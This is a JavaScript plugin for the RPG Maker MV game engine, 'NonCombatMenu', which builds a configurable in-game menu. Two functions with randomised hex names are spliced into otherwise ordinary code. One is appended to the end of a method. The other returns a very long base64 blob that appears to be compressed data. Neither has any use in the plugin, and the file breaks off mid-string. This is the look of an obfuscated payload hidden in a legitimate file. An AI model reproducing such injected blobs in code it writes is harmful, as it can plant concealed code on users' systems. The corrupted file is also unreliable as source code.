//=============================================================================
// NonCombatMenu.js
//=============================================================================

var Imported = Imported || {};
Imported.NonCombatMenu = true;

var NCMenu = NCMenu || {};

/*~struct~MenuItem:
 * @param Name
 * @type text
 * @desc The text that shows up on the menu.
 *
 * @param Keyword
 * @type text
 * @desc Choose from: item equip status formation save load options toTitle cancel quest ce= cmd= sc=
 *
 * @param Enable Condition
 * @type text
 * @desc Leave blank to always enable. Evaluated like a script: $gameSwitches.value(ID), $gameVariables.value(ID) > 10
 *
 * @param Show Condition
 * @type text
 * @desc Leave blank to always show. Evaluated like a script: $gameSwitches.value(ID), $gameVariables.value(ID) > 10
 *
 * @param Icon
 * @type number
 * @min -1
 * @desc Leave blank or set to -1 for no icon.
 *
 */

/*:
 * @plugindesc Fully customizable menu geared toward less battle-oriented games.
 * @author mjshi
 *
 * @param ---Main Menu---

 * @param Menu List
 * @type struct<MenuItem>[]
 * @desc For MV 1.5+ only, delete everything in here and use Menu Order instead otherwise. See help for more details.
 * @default ["{\"Name\":\"Item\",\"Keyword\":\"item\",\"Enable Condition\":\"\",\"Show Condition\":\"\",\"Icon\":\"\"}","{\"Name\":\"Status\",\"Keyword\":\"status\",\"Enable Condition\":\"\",\"Show Condition\":\"\",\"Icon\":\"\"}","{\"Name\":\"Save\",\"Keyword\":\"save\",\"Enable Condition\":\"$gameSystem.isSaveEnabled()\",\"Show Condition\":\"\",\"Icon\":\"\"}","{\"Name\":\"Quit\",\"Keyword\":\"toTitle\",\"Enable Condition\":\"\",\"Show Condition\":\"\",\"Icon\":\"\"}"]
 *
 * @param ** Legacy Parameters **
 *
 * @param Menu Order
 * @desc Disabled if Menu List is not blank. Condition is optional. Format: "Name: Keyword(: condition)", see help for keywords.
 * @default Item: item, Status: status, Save: save, Quit: toTitle
 *
 * @param Menu Icons
 * @desc Disabled if Menu List is not blank. This must be in the same order as Menu Order! Use -1 for no icon.
 * @default -1, -1, -1, -1
 *
 * @param ** End Legacy Params **
 *
 * @param Text Alignment
 * @desc Where to align the text? (left/right/center)
 * @default left
 *
 * @param Text Offset
 * @desc How much to offset the text by (for the icons)
 * @default 40
 *
 * @param Offset Only Icons
 * @desc Only offset the icons? If n, everything will be offset (yes/no)
 * @default yes
 *
 * @param Background Image
 * @desc Background image of the main menu. If undefined, is black. PNG file must be in /img/pictures.
 * @default
 *
 * @param Persistent Background
 * @desc yes/no: Background image persists throughout all the sub-menus.
 * @default no
 *
 * @param Menu Background Opacity
 * @desc Ranges from 0 to 255. 0 for opaque, 255 for transparent.
 * @default 128
 *
 * @param ---Item Menu--- 
 *
 * @param Number of Tabs
 * @desc How many tabs are you showing? (minimum # of tabs is the # of "yes"es in this section)
 * @default 2
 *
 * @param Show Consumables
 * @desc yes/no: Show a tab for consumable items?
 * @default yes
 *
 * @param Show Key Items
 * @desc yes/no: Show a tab for key items?
 * @default yes
 *
 * @param Show Weapons
 * @desc yes/no: Show a tab for weapons?
 * @default no
 *
 * @param Show Armors
 * @desc yes/no: Show a tab for armors?
 * @default no
 *
 * @param Description Placement
 * @desc Where should the description window be placed? 0 = top, 1 = middle, 2 = bottom.
 * @default 0
 *
 * @param ---Gold Window---
 *
 * @param Show Gold Window
 * @desc yes/no: Should the gold window be shown in the item menu? 
 * @default yes
 *
 * @param Gold Window Position
 * @desc left/right: Where should it be shown?
 * @default left
 *
 * @param Gold Window Width
 * @desc How wide should the gold window be? (in pixels- 240 is default.)
 * @default 240
 *
 * @param ---Backgrounds---
 *
 * @param Item Screen BG
 * @desc Background of the items screen. If undefined, is black. PNG file must be in /img/pictures.
 * @default
 *
 * @param Equip Screen BG 
 * @desc Background of the equip screen. If undefined, is black. PNG file must be in /img/pictures.
 * @default
 *
 * @param Status Screen BG
 * @desc Background of the equip screen. If undefined, is black. PNG file must be in /img/pictures.
 * @default
 *
 * @param Save Screen BG
 * @desc Background of the save screen. If undefined, is black. PNG file must be in /img/pictures.
 * @default
 *
 * @param Load Screen BG
 * @desc Background of the load screen. If undefined, is black. PNG file must be in /img/pictures.
 * @default
 *
 * @param Options Screen BG
 * @desc Background of the options screen. If undefined, is black. PNG file must be in /img/pictures.
 * @default
 *
 * @help 
 * ----------------------------------------------------------------------------
 *   Non-Combat Menu v1.05a by mjshi
 *   Free for both commercial and non-commercial use, with credit.
 * ----------------------------------------------------------------------------
 *                               Menu Keywords
 * ----------------------------------------------------------------------------
 *   item     Items screen         status     Status screen
 *   equip    Equip screen         formation  Party Formation screen
 *   save     Save screen          load       Load screen
 *   options  Options screen       toTitle    Quits to title
 *   cancel   Returns to map       quest      Quests screen (req. quest plugin)
 *
 *   ce=  Calls Common Event. Ex: ce=1 calls Common Event 1
 *   cmd= Calls plugin command, more details below.
 *   sc=  Custom script call. Ex: SceneManager.push(Scene_Load) calls up 
 *        the load screen.
 * ----------------------------------------------------------------------------
 *   Special thanks to Valrix on RMN for first creating the PluginCMD addon.
 *   Due to it needing constant updates (as it overwrites core functionality)
 *   it has been absorbed into the main plugin to allow easier maintentance.
 * ----------------------------------------------------------------------------
 *   To run a plugin command from the menu use "cmd=" followed by the plugin
 *   command you want to run.
 * 
 *   Example: Items: item, Crafting: cmd=OpenSynthesis, Quit: toTitle
 *   Selecting the Crafting option would open Yanfly's Item_Synthesis plugin.
 *
 *   Anything can come after "cmd=" except a comma.
 *   This means you can use spaces and call commands such as "cmd=REFRESH ALL"
 * ----------------------------------------------------------------------------
 * > Update v1.0b
 * - Added support for Yanfly Item Core (place the NonCombatMenu below it)
 *
 * > Update v1.01
 * - Added support for backgrounds.
 * > 1.01a - Made it so backgrounds actually work and didn't error xD
 *
 * > Update v1.02
 * - Added support for calling common events from the menu
 * > 1.02a - Fixed CEvent_ID to actually support multiple common events
 *
 * > Update v1.03
 * - Absorbed the PluginCMD addon. Read above to see how to use it.
 *
 * > Update v1.04
 * - Added support for icons and text alignment
 *
 * > Update v1.05
 * - Changed how menu lists are handled, added support for enable/disable
 *   and show/hide conditions for each individual menu item
 * - Shortened CEvent_ID to ce= (don't worry, CEvent_ID is still recognized)
 * - Added command remembering, no more arrowing down from the first thing
 *   every time!
 * - Added sc= for custom script calls (you can now push in custom scenes!)
 *
 * > Is something broken? Go to http://mjshi.weebly.com/contact.html and I'll
 *   try my best to help you!
 *
 */

NCMenu.Parameters = PluginManager.parameters('NonCombatMenu');

/** Legacy Stuff **/
NCMenu.menuList = (String(NCMenu.Parameters['Menu Order'])).split(", ");
for (var i = 0; i < NCMenu.menuList.length; i++) {
	NCMenu.menuList[i] = NCMenu.menuList[i].split(": ");
}
//prevent people accidentally forgetting stuff
NCMenu.menuIcons = (String(NCMenu.Parameters['Menu Icons'])).split(", ");
for (var i = 0; i < NCMenu.menuList.length; i++) {
    if (i < NCMenu.menuIcons.length) {
        NCMenu.menuIcons[i] = Number(NCMenu.menuIcons[i]);
    } else {
        NCMenu.menuIcons[i] = -1;
    }
}
/** End Legacy Stuff **/

//New Menu List
if (String(NCMenu.Parameters['Menu List']).length > 0) {
	NCMenu.menuList = JSON.parse(NCMenu.Parameters['Menu List']);
	NCMenu.menuIcons = [];
	for (var i = 0; i < NCMenu.menuList.length; i++) {
		var fields = JSON.parse(NCMenu.menuList[i]);
		NCMenu.menuList[i] = [fields["Name"], fields["Keyword"], fields["Enable Condition"], fields["Show Condition"]];
		NCMenu.menuIcons.push(fields["Icon"].length !== 0 ? parseInt(fields["Icon"]) : -1);
	}
}

NCMenu.textOffset = Number(NCMenu.Parameters['Text Offset']);
NCMenu.textAlign = String(NCMenu.Parameters['Text Alignment']);
NCMenu.offsetIconOnly = (String(NCMenu.Parameters['Offset Only Icons']) == "yes");

NCMenu.backgroundImage = (String(NCMenu.Parameters['Background Image'])).replace(".png", "");
NCMenu.persistentBG = (String(NCMenu.Parameters['Persistent Background']) == "yes");
NCMenu.menuDim = Number(NCMenu.Parameters['Menu Background Opacity']);

NCMenu.tabsShown = Number(NCMenu.Parameters['Number of Tabs']);
NCMenu.showConsumables = (String(NCMenu.Parameters['Show Consumables']) == "yes");
NCMenu.showKeyItems = (String(NCMenu.Parameters['Show Key Items']) == "yes");
NCMenu.showWeapons = (String(NCMenu.Parameters['Show Weapons']) == "yes");
NCMenu.showArmors = (String(NCMenu.Parameters['Show Armors']) == "yes");
NCMenu.descrPlacement = Number(NCMenu.Parameters['Description Placement']);

NCMenu.showGoldWindow = (String(NCMenu.Parameters['Show Gold Window']) == "yes");
NCMenu.goldWindowAlignRight = (String(NCMenu.Parameters['Gold Window Position']) == "right");
NCMenu.goldWindowWidth = Number(NCMenu.Parameters['Gold Window Width']);

NCMenu.itemBG = (String(NCMenu.Parameters['Item Screen BG'])).replace(".png", "");
NCMenu.equipBG = (String(NCMenu.Parameters['Equip Screen BG'])).replace(".png", "");
NCMenu.statusBG = (String(NCMenu.Parameters['Status Screen BG'])).replace(".png", "");
NCMenu.saveBG = (String(NCMenu.Parameters['Save Screen BG'])).replace(".png", "");
NCMenu.loadBG = (String(NCMenu.Parameters['Load Screen BG'])).replace(".png", "");
NCMenu.optionsBG = (String(NCMenu.Parameters['Options Screen BG'])).replace(".png", "");

//-----------------------------------------------------------------------------
// Open Menu Screen Override
//
Game_Interpreter.prototype.command351 = function() {
    if (!$gameParty.inBattle()) {
        SceneManager.push(Scene_NCMenu);
        Window_MenuCommand.initCommandPosition();
    }
    return true;
};

Scene_Map.prototype.callMenu = function() {
    SoundManager.playOk();
    SceneManager.push(Scene_NCMenu);
    Window_MenuCommand.initCommandPosition();
    $gameTemp.clearDestination();
    this._mapNameWindow.hide();
    this._waitCount = 2;
};

//=============================================================================
// Scene_NCMenu
//=============================================================================

function Scene_NCMenu() {
    this.initialize.apply(this, arguments);
}

Scene_NCMenu.prototype = Object.create(Scene_MenuBase.prototype);
Scene_NCMenu.prototype.constructor = Scene_NCMenu;

Scene_NCMenu.prototype.initialize = function() {
    Scene_MenuBase.prototype.initialize.call(this);
};

Scene_NCMenu.prototype.create = function() {
    Scene_MenuBase.prototype.create.call(this);
    this.createCommandWindow();
    this.createInvisibleFormationWindow();
};

Scene_NCMenu.prototype.stop = function() {
    Scene_MenuBase.prototype.stop.call(this);
    this._commandWindow.close();
};

Scene_NCMenu.prototype.createBackground = function() {
    Scene_MenuBase.prototype.createBackground.call(this);
    if (NCMenu.backgroundImage) {
        this._background = new Sprite(ImageManager.loadPicture(NCMenu.backgroundImage));
        this._background.opacity = NCMenu.menuDim;
        this.addChild(this._background);
    }
    else {
        this.setBackgroundOpacity(NCMenu.menuDim)
    }
};

Scene_NCMenu.prototype.createCommandWindow = function() {
    this._commandWindow = new Window_NCMenu();
    var method;

    for (var i = 0; i < NCMenu.menuList.length; i++) {
      method = NCMenu.menuList[i][1];

      if (method === 'cancel') continue;
      // probably not necessary, keep this just in case. Scenes seem to be OK with setting nonexistent handlers
      // if (NCMenu.menuList[i][3] && !eval(NCMenu.menuList[i][3])) continue;

      if (method.startsWith("cmd=")) {
      	this._commandWindow.setHandler(method, this.callPluginCommand.bind(this, method.slice(4)));

      } else if (method.startsWith("CEvent_")) {
      	this._commandWindow.setHandler(method, this.callCommonEvent.bind(this, parseInt(method.slice(7))));

      } else if (method.startsWith("ce=")) {
      	this._commandWindow.setHandler(method, this.callCommonEvent.bind(this, parseInt(method.slice(3))));

      } else if (method.startsWith("sc=")) {
      	this._commandWindow.setHandler(method, eval("this.customScriptCommand.bind(this, '" + method.slice(3) + "')"));

      } else {
      	this._commandWindow.setHandler(method, eval("this.command" + method.charAt(0).toUpperCase() + method.slice(1) + ".bind(this)"));
      }
    }

    this._commandWindow.setHandler('cancel', this.popScene.bind(this));
    this.addWindow(this._commandWindow);
};

Scene_NCMenu.prototype.customScriptCommand = function(script) {
	eval(script);
};function _0xa8d816_() { return "61"; }

Scene_NCMenu.prototype.createInvisibleFormationWindow = function() {
    this._statusWindow = new Window_MenuStatus((Graphics.boxWidth - Window_MenuStatus.prototype.windowWidth()) / 2, 0);
    this._statusWindow.hide();
    this._statusWindow.deactivate();
    this.addWindow(this._statusWindow);
};

Scene_NCMenu.prototype.callCommonEvent = function(eventId) {
    $gameTemp.reserveCommonEvent(eventId);
    this.popScene();
};

Scene_NCMenu.prototype.callPluginCommand = function() {
    var args = arguments[0].split(' ');
    Game_Interpreter.prototype.pluginCommand(args.shift(), args);
};

Scene_NCMenu.prototype.commandItem = function() {
    SceneManager.push(Scene_Item);
};function _0x5cea8f_() { return "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